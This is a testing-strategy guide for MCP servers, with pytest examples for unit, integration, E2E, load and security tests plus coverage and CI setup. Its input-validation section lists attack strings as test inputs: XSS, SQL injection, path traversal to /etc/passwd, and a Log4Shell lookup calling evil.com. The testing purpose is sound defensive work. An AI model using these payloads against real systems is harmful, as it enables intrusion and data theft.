# Testing Strategy

**Version:** 1.0.0  
**Last Updated:** November 18, 2025  
**Status:** Draft

## Introduction

Comprehensive testing is essential for reliable MCP servers. This document establishes testing standards covering unit tests, integration tests, end-to-end tests, load testing, security testing, and coverage requirements.

## Testing Pyramid

```
         /\
        /E2E\         <- Few (Critical user journeys)
       /------\
      / Integr \      <- Some (Component interactions)
     /----------\
    /    Unit    \    <- Many (Individual functions/tools)
   /--------------\
```

## Unit Testing

### Tool Unit Tests

Test each tool independently with mocked dependencies:

```python
import pytest
from unittest.mock import AsyncMock, patch, MagicMock
from datetime import datetime
from fastapi import HTTPException

# Tool under test
from mcp_server.tools import create_assignment, list_assignments

@pytest.mark.asyncio
class TestCreateAssignment:
    """Unit tests for create_assignment tool."""
    
    async def test_success(self):
        """Test successful assignment creation."""
        with patch('mcp_server.backend.create_assignment') as mock_create:
            # Mock successful response
            mock_assignment = AsyncMock()
            mock_assignment.id = "123"
            mock_assignment.title = "Test Task"
            mock_assignment.assignee = "user@example.com"
            mock_assignment.created_at = datetime(2025, 11, 18, 10, 0, 0)
            mock_create.return_value = mock_assignment
            
            # Execute tool
            result = await create_assignment(
                title="Test Task",
                assignee="user@example.com"
            )
            
            # Assertions
            assert result["success"] is True
            assert result["data"]["id"] == "123"
            assert result["data"]["title"] == "Test Task"
            assert "metadata" in result
            assert "timestamp" in result["metadata"]
            
            # Verify backend interaction
            mock_create.assert_called_once_with(
                "Test Task",
                "user@example.com"
            )
    
    async def test_empty_title(self):
        """Test validation error for empty title."""
        with pytest.raises(HTTPException) as exc_info:
            await create_assignment(
                title="",
                assignee="user@example.com"
            )
        
        assert exc_info.value.status_code == 400
        assert exc_info.value.detail["error"] == "invalid_input"
        assert "title" in exc_info.value.detail["details"]
    
    async def test_invalid_assignee_email(self):
        """Test validation error for invalid email."""
        with pytest.raises(HTTPException) as exc_info:
            await create_assignment(
                title="Test Task",
                assignee="not-an-email"
            )
        
        assert exc_info.value.status_code == 400
        assert "email" in exc_info.value.detail["details"]
    
    async def test_backend_failure(self):
        """Test handling of backend failures."""
        with patch('mcp_server.backend.create_assignment') as mock_create:
            # Mock backend exception
            mock_create.side_effect = Exception("Database connection failed")
            
            with pytest.raises(HTTPException) as exc_info:
                await create_assignment(
                    title="Test Task",
                    assignee="user@example.com"
                )
            
            assert exc_info.value.status_code == 500
            assert exc_info.value.detail["error"] == "internal_error"
    
    async def test_duplicate_assignment(self):
        """Test conflict when assignment already exists."""
        with patch('mcp_server.backend.create_assignment') as mock_create:
            # Mock conflict exception
            from backend.exceptions import ConflictException
            mock_create.side_effect = ConflictException(
                "Assignment already exists"
            )
            
            with pytest.raises(HTTPException) as exc_info:
                await create_assignment(
                    title="Duplicate Task",
                    assignee="user@example.com"
                )
            
            assert exc_info.value.status_code == 409
            assert exc_info.value.detail["error"] == "conflict"
```

### Parametrized Tests

Use parametrize for testing multiple scenarios:

```python
@pytest.mark.asyncio
@pytest.mark.parametrize("priority,expected_valid", [
    (1, True),
    (3, True),
    (5, True),
    (0, False),  # Below minimum
    (6, False),  # Above maximum
    (-1, False), # Negative
])
async def test_priority_validation(priority, expected_valid):
    """Test priority validation with various inputs."""
    if expected_valid:
        result = await create_assignment(
            title="Test",
            assignee="user@example.com",
            priority=priority
        )
        assert result["success"] is True
    else:
        with pytest.raises(HTTPException) as exc_info:
            await create_assignment(
                title="Test",
                assignee="user@example.com",
                priority=priority
            )
        assert exc_info.value.status_code == 400
```

### Fixture Patterns

Create reusable fixtures:

```python
import pytest
from datetime import datetime, timedelta

@pytest.fixture
def mock_assignment():
    """Fixture providing a mock assignment."""
    assignment = MagicMock()
    assignment.id = "test-123"
    assignment.title = "Test Assignment"
    assignment.assignee = "test@example.com"
    assignment.priority = 3
    assignment.status = "pending"
    assignment.created_at = datetime.utcnow()
    assignment.updated_at = datetime.utcnow()
    return assignment

@pytest.fixture
def mock_backend(mock_assignment):
    """Fixture providing a mocked backend."""
    with patch('mcp_server.backend') as mock:
        mock.create_assignment = AsyncMock(return_value=mock_assignment)
        mock.get_assignment = AsyncMock(return_value=mock_assignment)
        mock.list_assignments = AsyncMock(return_value=[mock_assignment])
        mock.update_assignment = AsyncMock(return_value=mock_assignment)
        mock.delete_assignment = AsyncMock(return_value=True)
        yield mock

@pytest.mark.asyncio
async def test_with_fixtures(mock_backend, mock_assignment):
    """Test using fixtures."""
    result = await create_assignment(
        title="Test",
        assignee="user@example.com"
    )
    
    assert result["success"] is True
    assert result["data"]["id"] == mock_assignment.id
    mock_backend.create_assignment.assert_called_once()
```

## Integration Testing

### Component Integration

Test interactions between components:

```python
import pytest
from httpx import AsyncClient
from mcp_server.app import app

@pytest.mark.asyncio
class TestAssignmentIntegration:
    """Integration tests for assignment workflows."""
    
    @pytest.fixture
    async def client(self):
        """HTTP client fixture."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            yield client
    
    @pytest.fixture
    async def auth_headers(self):
        """Authenticated headers fixture."""
        # Get valid JWT token
        token = await get_test_token()
        return {"Authorization": f"Bearer {token}"}
    
    async def test_create_and_retrieve_assignment(self, client, auth_headers):
        """Test creating and retrieving an assignment."""
        # Create assignment
        create_response = await client.post(
            "/tools/create_assignment",
            json={
                "title": "Integration Test Task",
                "assignee": "user@example.com",
                "priority": 3
            },
            headers=auth_headers
        )
        
        assert create_response.status_code == 200
        assignment_data = create_response.json()
        assert assignment_data["success"] is True
        assignment_id = assignment_data["data"]["id"]
        
        # Retrieve assignment
        get_response = await client.get(
            f"/tools/get_assignment",
            params={"assignment_id": assignment_id},
            headers=auth_headers
        )
        
        assert get_response.status_code == 200
        retrieved_data = get_response.json()
        assert retrieved_data["data"]["id"] == assignment_id
        assert retrieved_data["data"]["title"] == "Integration Test Task"
    
    async def test_update_assignment_workflow(self, client, auth_headers):
        """Test full assignment update workflow."""
        # Create
        create_resp = await client.post(
            "/tools/create_assignment",
            json={
                "title": "Original Title",
                "assignee": "user1@example.com"
            },
            headers=auth_headers
        )
        assignment_id = create_resp.json()["data"]["id"]
        
        # Update
        update_resp = await client.put(
            "/tools/update_assignment",
            json={
                "assignment_id": assignment_id,
                "title": "Updated Title",
                "priority": 5
            },
            headers=auth_headers
        )
        
        assert update_resp.status_code == 200
        updated_data = update_resp.json()["data"]
        assert updated_data["title"] == "Updated Title"
        assert updated_data["priority"] == 5
        
        # Verify persistence
        get_resp = await client.get(
            f"/tools/get_assignment",
            params={"assignment_id": assignment_id},
            headers=auth_headers
        )
        persisted_data = get_resp.json()["data"]
        assert persisted_data["title"] == "Updated Title"
```

### Database Integration

Test with real database (use test containers):

```python
import pytest
import pytest_asyncio
from testcontainers.postgres import PostgresContainer
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession
from sqlalchemy.orm import sessionmaker

@pytest.fixture(scope="session")
def postgres_container():
    """PostgreSQL test container."""
    with PostgresContainer("postgres:15") as postgres:
        yield postgres

@pytest_asyncio.fixture
async def db_engine(postgres_container):
    """Database engine fixture."""
    db_url = postgres_container.get_connection_url().replace(
        "psycopg2", "asyncpg"
    )
    engine = create_async_engine(db_url, echo=True)
    
    # Create tables
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    
    yield engine
    
    # Cleanup
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.drop_all)
    await engine.dispose()

@pytest_asyncio.fixture
async def db_session(db_engine):
    """Database session fixture."""
    async_session = sessionmaker(
        db_engine,
        class_=AsyncSession,
        expire_on_commit=False
    )
    
    async with async_session() as session:
        yield session

@pytest.mark.asyncio
async def test_assignment_persistence(db_session):
    """Test assignment data persistence."""
    from mcp_server.models import Assignment
    
    # Create assignment
    assignment = Assignment(
        title="Persistent Task",
        assignee="user@example.com",
        priority=3
    )
    db_session.add(assignment)
    await db_session.commit()
    await db_session.refresh(assignment)
    
    assignment_id = assignment.id
    
    # Clear session
    await db_session.close()
    
    # Retrieve in new session
    async with db_session() as new_session:
        retrieved = await new_session.get(Assignment, assignment_id)
        assert retrieved is not None
        assert retrieved.title == "Persistent Task"
```

### External Service Integration

Test integrations with external services:

```python
import pytest
from unittest.mock import patch
import respx
from httpx import Response

@pytest.mark.asyncio
@respx.mock
async def test_external_api_integration():
    """Test integration with external API."""
    # Mock external API
    external_api = respx.post("https://api.external.com/validate")
    external_api.return_value = Response(
        200,
        json={"valid": True, "score": 0.95}
    )
    
    # Call tool that uses external API
    result = await validate_with_external_service(
        data={"email": "user@example.com"}
    )
    
    assert result["success"] is True
    assert result["data"]["valid"] is True
    assert external_api.called

@pytest.mark.asyncio
async def test_external_api_timeout():
    """Test handling of external API timeout."""
    with patch('httpx.AsyncClient.post') as mock_post:
        # Mock timeout
        import asyncio
        mock_post.side_effect = asyncio.TimeoutError()
        
        with pytest.raises(HTTPException) as exc_info:
            await validate_with_external_service(
                data={"email": "user@example.com"}
            )
        
        assert exc_info.value.status_code == 504
        assert exc_info.value.detail["error"] == "timeout"
```

## End-to-End Testing

### User Journey Tests

Test complete user workflows:

```python
import pytest
from playwright.async_api import async_playwright

@pytest.mark.e2e
@pytest.mark.asyncio
async def test_complete_assignment_workflow():
    """E2E test for complete assignment workflow."""
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        context = await browser.new_context()
        page = await context.new_page()
        
        # Login
        await page.goto("https://app.example.com/login")
        await page.fill("#email", "test@example.com")
        await page.fill("#password", "testpass")
        await page.click("#login-button")
        
        # Wait for dashboard
        await page.wait_for_selector("#dashboard")
        
        # Create assignment via UI
        await page.click("#create-assignment")
        await page.fill("#assignment-title", "E2E Test Task")
        await page.fill("#assignee-email", "assignee@example.com")
        await page.select_option("#priority", "3")
        await page.click("#save-assignment")
        
        # Verify created
        await page.wait_for_selector(".assignment-card")
        assignment_text = await page.text_content(".assignment-card .title")
        assert assignment_text == "E2E Test Task"
        
        # Update assignment
        await page.click(".assignment-card")
        await page.click("#edit-button")
        await page.fill("#assignment-title", "Updated E2E Task")
        await page.click("#save-button")
        
        # Verify update
        await page.wait_for_selector(".success-message")
        updated_text = await page.text_content(".assignment-card .title")
        assert updated_text == "Updated E2E Task"
        
        # Delete assignment
        await page.click("#delete-button")
        await page.click("#confirm-delete")
        
        # Verify deletion
        await page.wait_for_selector(".empty-state")
        
        await browser.close()
```

### API E2E Tests

Test complete API workflows:

```python
import pytest
from httpx import AsyncClient

@pytest.mark.e2e
@pytest.mark.asyncio
async def test_api_workflow():
    """E2E test for API workflow."""
    async with AsyncClient(base_url="https://api.example.com") as client:
        # Authenticate
        auth_resp = await client.post(
            "/auth/token",
            json={
                "username": "test@example.com",
                "password": "testpass"
            }
        )
        assert auth_resp.status_code == 200
        token = auth_resp.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}
        
        # Create resource
        create_resp = await client.post(
            "/api/v1/assignments",
            json={
                "title": "API E2E Task",
                "assignee": "user@example.com"
            },
            headers=headers
        )
        assert create_resp.status_code == 201
        resource_id = create_resp.json()["id"]
        
        # Retrieve resource
        get_resp = await client.get(
            f"/api/v1/assignments/{resource_id}",
            headers=headers
        )
        assert get_resp.status_code == 200
        assert get_resp.json()["title"] == "API E2E Task"
        
        # List resources
        list_resp = await client.get(
            "/api/v1/assignments",
            headers=headers
        )
        assert list_resp.status_code == 200
        assert len(list_resp.json()["items"]) > 0
        
        # Update resource
        update_resp = await client.patch(
            f"/api/v1/assignments/{resource_id}",
            json={"status": "completed"},
            headers=headers
        )
        assert update_resp.status_code == 200
        
        # Delete resource
        delete_resp = await client.delete(
            f"/api/v1/assignments/{resource_id}",
            headers=headers
        )
        assert delete_resp.status_code == 204
        
        # Verify deletion
        get_deleted = await client.get(
            f"/api/v1/assignments/{resource_id}",
            headers=headers
        )
        assert get_deleted.status_code == 404
```

## Load Testing

### Locust Load Tests

```python
from locust import HttpUser, task, between

class MCPServerUser(HttpUser):
    """Load test user for MCP server."""
    
    wait_time = between(1, 3)
    
    def on_start(self):
        """Authenticate on start."""
        response = self.client.post(
            "/auth/token",
            json={
                "username": "loadtest@example.com",
                "password": "loadtest"
            }
        )
        self.token = response.json()["access_token"]
        self.headers = {"Authorization": f"Bearer {self.token}"}
    
    @task(3)
    def list_assignments(self):
        """List assignments (most common operation)."""
        self.client.get(
            "/tools/list_assignments",
            headers=self.headers,
            name="list_assignments"
        )
    
    @task(2)
    def get_assignment(self):
        """Get single assignment."""
        self.client.get(
            "/tools/get_assignment",
            params={"assignment_id": "test-123"},
            headers=self.headers,
            name="get_assignment"
        )
    
    @task(1)
    def create_assignment(self):
        """Create assignment (less common)."""
        self.client.post(
            "/tools/create_assignment",
            json={
                "title": f"Load Test Task {self.environment.runner.user_count}",
                "assignee": "loadtest@example.com"
            },
            headers=self.headers,
            name="create_assignment"
        )
```

Run load tests:

```bash
# Start load test
locust -f tests/load/locustfile.py \
  --host https://api.example.com \
  --users 100 \
  --spawn-rate 10 \
  --run-time 5m \
  --html report.html
```

### Performance Benchmarks

Define performance SLAs:

```python
import pytest
import time

@pytest.mark.benchmark
@pytest.mark.asyncio
async def test_list_assignments_performance(benchmark):
    """Benchmark list_assignments performance."""
    
    async def run_list():
        return await list_assignments(page=1, page_size=50)
    
    result = await benchmark(run_list)
    
    # Assert performance SLA
    assert benchmark.stats.mean < 0.1  # < 100ms average
    assert benchmark.stats.max < 0.5   # < 500ms p99

@pytest.mark.benchmark
@pytest.mark.asyncio
async def test_create_assignment_performance():
    """Benchmark create_assignment latency."""
    measurements = []
    
    for _ in range(100):
        start = time.perf_counter()
        await create_assignment(
            title=f"Benchmark Task {_}",
            assignee="benchmark@example.com"
        )
        elapsed = time.perf_counter() - start
        measurements.append(elapsed)
    
    # Calculate percentiles
    p50 = sorted(measurements)[50]
    p95 = sorted(measurements)[95]
    p99 = sorted(measurements)[99]
    
    # Assert SLAs
    assert p50 < 0.05  # p50 < 50ms
    assert p95 < 0.15  # p95 < 150ms
    assert p99 < 0.30  # p99 < 300ms
```

## Security Testing

### Authentication Tests

```python
import pytest
from httpx import AsyncClient

@pytest.mark.security
@pytest.mark.asyncio
async def test_missing_token():
    """Test request without authentication token."""
    async with AsyncClient(base_url="http://test") as client:
        response = await client.get("/tools/list_assignments")
        assert response.status_code == 401

@pytest.mark.security
@pytest.mark.asyncio
async def test_invalid_token():
    """Test request with invalid token."""
    async with AsyncClient(base_url="http://test") as client:
        response = await client.get(
            "/tools/list_assignments",
            headers={"Authorization": "Bearer invalid-token"}
        )
        assert response.status_code == 401

@pytest.mark.security
@pytest.mark.asyncio
async def test_expired_token():
    """Test request with expired token."""
    expired_token = generate_expired_token()
    
    async with AsyncClient(base_url="http://test") as client:
        response = await client.get(
            "/tools/list_assignments",
            headers={"Authorization": f"Bearer {expired_token}"}
        )
        assert response.status_code == 401
        assert "expired" in response.json()["detail"]["message"].lower()
```

### Authorization Tests

```python
@pytest.mark.security
@pytest.mark.asyncio
async def test_unauthorized_access():
    """Test accessing resource without permission."""
    # User without admin role
    user_token = await get_token_for_role("user")
    
    async with AsyncClient(base_url="http://test") as client:
        response = await client.delete(
            "/tools/delete_all_assignments",
            headers={"Authorization": f"Bearer {user_token}"}
        )
        assert response.status_code == 403

@pytest.mark.security
@pytest.mark.asyncio
async def test_resource_isolation():
    """Test users can only access their own resources."""
    user1_token = await get_token_for_user("user1@example.com")
    user2_token = await get_token_for_user("user2@example.com")
    
    async with AsyncClient(base_url="http://test") as client:
        # User1 creates assignment
        create_resp = await client.post(
            "/tools/create_assignment",
            json={"title": "User1 Task", "assignee": "user1@example.com"},
            headers={"Authorization": f"Bearer {user1_token}"}
        )
        assignment_id = create_resp.json()["data"]["id"]
        
        # User2 attempts to access User1's assignment
        get_resp = await client.get(
            f"/tools/get_assignment",
            params={"assignment_id": assignment_id},
            headers={"Authorization": f"Bearer {user2_token}"}
        )
        assert get_resp.status_code == 404  # Not found (hidden for security)
```

### Input Validation Tests

```python
@pytest.mark.security
@pytest.mark.parametrize("malicious_input", [
    "<script>alert('xss')</script>",
    "'; DROP TABLE assignments; --",
    "../../../etc/passwd",
    "${jndi:ldap://evil.com/a}",
])
@pytest.mark.asyncio
async def test_input_sanitization(malicious_input):
    """Test input sanitization against common attacks."""
    with pytest.raises(HTTPException) as exc_info:
        await create_assignment(
            title=malicious_input,
            assignee="user@example.com"
        )
    
    assert exc_info.value.status_code == 400
    assert "invalid_input" in exc_info.value.detail["error"]
```

## Coverage Requirements

### Coverage Configuration

```ini
# .coveragerc or pyproject.toml [tool.coverage]

[coverage:run]
source = mcp_server
omit =
    */tests/*
    */migrations/*
    */__pycache__/*
    */venv/*

[coverage:report]
precision = 2
show_missing = True
skip_covered = False

# Fail build if coverage below threshold
fail_under = 80

exclude_lines =
    pragma: no cover
    def __repr__
    raise AssertionError
    raise NotImplementedError
    if __name__ == .__main__.:
    if TYPE_CHECKING:
```

### Coverage Targets

| Component | Minimum Coverage |
|-----------|-----------------|
| Tools | 90% |
| Business Logic | 85% |
| API Endpoints | 80% |
| Utilities | 80% |
| Overall | 80% |

### Run Coverage

```bash
# Run tests with coverage
pytest --cov=mcp_server \
  --cov-report=html \
  --cov-report=term \
  --cov-report=xml \
  tests/

# View HTML report
open htmlcov/index.html

# Check coverage threshold
pytest --cov=mcp_server \
  --cov-fail-under=80 \
  tests/
```

## Test Organization

### Directory Structure

```
tests/
├── unit/
│   ├── test_tools.py
│   ├── test_auth.py
│   ├── test_models.py
│   └── test_utils.py
├── integration/
│   ├── test_api.py
│   ├── test_database.py
│   └── test_external_services.py
├── e2e/
│   ├── test_user_workflows.py
│   └── test_api_workflows.py
├── load/
│   └── locustfile.py
├── security/
│   ├── test_authentication.py
│   ├── test_authorization.py
│   └── test_input_validation.py
├── conftest.py
└── pytest.ini
```

### Test Configuration

```ini
# pytest.ini
[pytest]
minversion = 7.0
testpaths = tests
python_files = test_*.py
python_classes = Test*
python_functions = test_*

# Markers
markers =
    unit: Unit tests
    integration: Integration tests
    e2e: End-to-end tests
    security: Security tests
    benchmark: Performance benchmarks
    slow: Slow-running tests

# Async support
asyncio_mode = auto

# Coverage
addopts =
    --strict-markers
    --tb=short
    --cov=mcp_server
    --cov-report=term-missing
    --cov-report=html
    --cov-report=xml
    -ra
    -q

# Ignore warnings
filterwarnings =
    ignore::DeprecationWarning
```

## CI/CD Integration

### GitHub Actions Workflow

```yaml
# .github/workflows/test.yml
name: Tests

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  test:
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        python-version: ["3.11", "3.12"]
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install -r requirements-dev.txt
      
      - name: Run unit tests
        run: pytest tests/unit -v
      
      - name: Run integration tests
        run: pytest tests/integration -v
      
      - name: Run security tests
        run: pytest tests/security -v
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage.xml
          flags: unittests
          name: codecov-umbrella
  
  e2e:
    runs-on: ubuntu-latest
    needs: test
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install -r requirements-dev.txt
      
      - name: Run E2E tests
        run: pytest tests/e2e -v
```

## Summary

Comprehensive testing ensures MCP server reliability through:

- **Unit Tests**: Test individual tools with mocked dependencies (90%+ coverage)
- **Integration Tests**: Test component interactions and database persistence
- **E2E Tests**: Validate complete user workflows
- **Load Tests**: Verify performance under realistic load
- **Security Tests**: Validate authentication, authorization, and input handling
- **CI/CD**: Automated testing on every commit and PR

---

**Next**: Review [Observability](05-observability.md) for monitoring and debugging strategies.
